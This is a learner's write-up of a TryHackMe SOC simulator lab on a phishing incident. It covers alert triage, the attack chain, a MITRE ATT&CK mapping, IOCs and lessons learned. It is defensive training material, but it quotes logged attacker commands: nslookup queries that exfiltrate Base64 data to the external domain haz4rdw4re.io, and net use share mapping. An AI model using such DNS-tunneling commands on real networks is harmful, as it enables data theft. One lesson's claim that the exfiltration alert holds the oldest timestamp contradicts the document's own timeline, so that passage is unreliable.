# Phishing Unfolding — TryHackMe SOC Simulator

**Room:** [Phishing Unfolding](https://tryhackme.com/room/phishingunfolding)
**Path:** SOC Level 1 → Phishing Analysis
**SIEM used:** Splunk
**Date completed:** August 2026

## Scenario

Real-time SOC simulator: alerts arrive continuously in an Alert Queue as a live phishing attack unfolds within a corporate network (fictional company "TryHatMe"). Each alert was triaged, investigated using SIEM/sysmon data, classified as True Positive (TP) or False Positive (FP), and documented in a case report.

## Alert Triage Summary

| ID | Alert Rule | Type | Severity | Verdict | Notes |
|---|---|---|---|---|---|
| 1000 | Suspicious email from external domain | Phishing | Low | **TP** | Advance-fee/inheritance scam, `.me` TLD, requests banking details, false urgency |
| 1001 | Suspicious Parent Child Relationship | Process | Low | **FP** | `TrustedInstaller.exe` spawned by `services.exe` — legitimate Windows servicing process |
| 1006 | Suspicious Parent Child Relationship | Process | Low | **TP** | `rdpclip.exe` (legitimate process) on already-compromised host win-3450 — unverified RDP session warrants investigation |
| 1007 | Suspicious Parent Child Relationship | Process | Low | **FP** | `taskhostw.exe KEYROAMING` on unrelated host (win-3451) — legitimate scheduled task |
| — | Suspicious Parent Child Relationship | Process | Low | **FP** | `taskhostw.exe KEYROAMING` spawned by `svchost.exe` — legitimate scheduled task |
| — | Suspicious email from external domain | Phishing | Low | **FP** | Generic marketing spam, no malicious payload or credential request |
| — | Suspicious email from external domain | Phishing | High | **TP** | Urgency/legal-threat phishing with malicious `.zip` attachment — likely initial infection vector |
| 1022 | Network drive mapped to a local drive | Execution | Medium | **TP** | `net use Z: \\FILESRV-01\SSF-FinancialRecords` — data collection from financial records share (T1039) |
| 1024 | Network drive disconnected from a local drive | Execution | Medium | **TP** | `net use Z: /delete` — share unmapped ~1 min after access, before exfiltration began (anti-forensic cleanup) |
| 1034 | Suspicious Parent Child Relationship | Process | High | **TP** | `powershell.exe → nslookup.exe`, DNS tunneling exfiltration to `haz4rdw4re.io` |
| 1026 | Suspicious Parent Child Relationship | Process | High | **TP** | Second DNS tunneling fragment from `\downloads\exfiltration\`, same host/campaign as 1034 |

## Key Incident: DNS Tunneling Exfiltration (Host win-3450, user michael.ascot)

### Attack Chain Reconstructed

**Step 1 — Initial vector:** Phishing email from `john@hatmakereurope.xyz` to `michael.ascot@tryhatme.com`, subject *"FINAL NOTICE: Overdue Payment - Account Suspension Imminent"*, using urgency/legal-threat social engineering. Malicious attachment: `ImportantInvoice-Febrary.zip` (note filename typo).

**Step 2 — Execution:** Process activity on host `win-3450`, user `michael.ascot`, originating from the `downloads\` directory. `powershell.exe` (PID 3728) becomes the parent process for all subsequent attacker activity on this host.

**Step 3 — Collection (15:50:43):** `powershell.exe` spawns `net.exe`, mapping a network share to a local drive:

```
"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords
```

This grants access to a financial records share using the compromised user's legitimate permissions — consistent with **T1039 (Data from Network Shared Drive)**.

**Step 4 — Cleanup (15:51:41, ~1 minute later):** `powershell.exe` spawns `net.exe` again to disconnect the mapped drive:

```
"C:\Windows\system32\net.exe" use Z: /delete
```

This reduces the live visibility of the share access, though the activity remains recoverable via process/sysmon logs (as demonstrated by this investigation).

**Step 5 — Possible additional access (15:29:20, out of sequence with the above but same host):** `rdpclip.exe` (a legitimate Windows process for RDP clipboard sync) was observed on win-3450, indicating an active Remote Desktop session. Given the host is already confirmed compromised, this session could not be dismissed as routine and was flagged for source verification (IP/account of the RDP connection).

**Step 6 — Exfiltration (15:52:28 onward):** `powershell.exe` (parent) spawns `nslookup.exe` (child), issuing DNS queries with Base64-encoded data embedded as subdomains of `haz4rdw4re.io`:

```
"C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io
"C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
```

Multiple related alerts (10 total, same host/timestamp window) indicate data was split across several DNS queries — consistent with DNS tunneling, where data is chunked to fit within DNS query length limits and exfiltrated over a protocol rarely blocked by firewalls.

### Why DNS Tunneling Works

DNS is essential for normal network operation, so it is rarely blocked or deeply inspected by firewalls. Attackers abuse this trust by encoding stolen data (Base64) as fake subdomains and querying a domain they control (`haz4rdw4re.io`). Their authoritative DNS server receives the "queries," decodes the embedded data, and the attacker recovers the exfiltrated information — without ever establishing an obviously suspicious direct connection.

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Spearphishing Attachment | T1566.001 |
| Command and Scripting Interpreter: PowerShell | T1059.001 |
| Data from Network Shared Drive | T1039 |
| Remote Services (RDP, under investigation) | T1021.001 |
| Exfiltration Over Alternative Protocol: DNS | T1048.003 |
| Application Layer Protocol: DNS | T1071.004 |

### IOCs Summary

| Type | Value |
|---|---|
| Host | win-3450 |
| User | michael.ascot |
| Malicious sender | john@hatmakereurope.xyz |
| Malicious attachment | ImportantInvoice-Febrary.zip |
| Accessed share | \\FILESRV-01\SSF-FinancialRecords |
| C2 / exfiltration domain | haz4rdw4re.io |
| Parent process (all stages) | powershell.exe (PID 3728) |
| Child processes | net.exe, nslookup.exe, (rdpclip.exe — under investigation) |

### Escalation

Escalated to Incident Response team due to confirmed, active data collection and exfiltration. Recommended actions: isolate host win-3450 from the network, suspend/disable the `michael.ascot` account (credentials likely compromised, could grant access beyond this single share), block `haz4rdw4re.io` at firewall/DNS level, review FILESRV-01 access logs to determine exact data accessed, verify the source of the RDP session, and analyze the malicious attachment in a sandboxed environment.

## Lessons Learned

- **Alert ID ≠ chronological order.** The ID field only reflects the order alerts arrived in the queue during the live simulation, not when the underlying event actually happened. Reconstructing the true attack sequence required sorting by the `timestamp` field inside each alert's sysmon details — the oldest real timestamp (alert 1034, DNS tunneling) turned out to be the anchor point for the whole incident, even though other alerts with lower IDs came later chronologically.

- **Lateral movement vs. accessing a shared resource are not the same thing.** Initially assumed mapping `\\FILESRV-01\SSF-FinancialRecords` was lateral movement, but the attacker never executed anything on that second host — they only read/collected data from a share the compromised user already had legitimate permissions to. That's **T1039 (Data from Network Shared Drive)**, part of the *Collection* phase, not *Lateral Movement*.

- **Distinguishing legitimate Windows processes from malicious ones is about context, not memorizing every binary.** The recurring checklist that worked: (1) does the parent-child relationship make logical sense (e.g. `services.exe` → `TrustedInstaller.exe`)? (2) is it running from a standard system path (`system32`) or a user-writable one (`downloads\`)? (3) are the command-line arguments documented/normal, or do they contain encoded data, external domains, or unusual flags — e.g. `taskhostw.exe KEYROAMING` (normal, documented Microsoft parameter) vs. `nslookup.exe RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io` (Base64-encoded data pointing to an unknown external domain)? (4) is the exact filename/path legitimate, or a lookalike — e.g. the real `svchost.exe` always runs from `C:\Windows\System32\`; a file with that same name (or a near-identical one like `svch0st.exe`) running from `C:\Users\...\downloads\` is a red flag regardless of the filename matching?

- **A legitimate process can still be a red flag depending on host state.** `rdpclip.exe` is a normal Windows process, but its presence on a host already confirmed compromised (`win-3450`) meant it couldn't be dismissed as routine — it indicated an active RDP session that needed source verification, rather than automatic closure as a false positive.

- **How DNS tunneling actually works, end to end.** Understanding *why* attackers abuse DNS for exfiltration (it's rarely blocked or deeply inspected by firewalls) and *how* the data gets out (Base64-encoded chunks embedded as fake subdomains, sent as multiple queries because of DNS length limits, then decoded on the attacker's authoritative server) was the biggest technical takeaway from this room.

- **Attackers clean up, but not perfectly.** The `net use Z: /delete` command right before exfiltration began was an attempt to reduce live visibility of the share access — but it still left a full trail in sysmon logs, which is exactly what made it possible to reconstruct the sequence.

## Conclusion

This simulation demonstrated a full attack lifecycle — phishing delivery, execution, data collection from a financial records share, anti-forensic cleanup, a possible secondary access vector via RDP, and active data exfiltration via DNS tunneling. Reconstructing the correct chronological order (using the `timestamp` field rather than alert ID or arrival order) was essential to correctly link ten separate low-context alerts into a single coherent incident — a core SOC L1 triage and correlation skill.
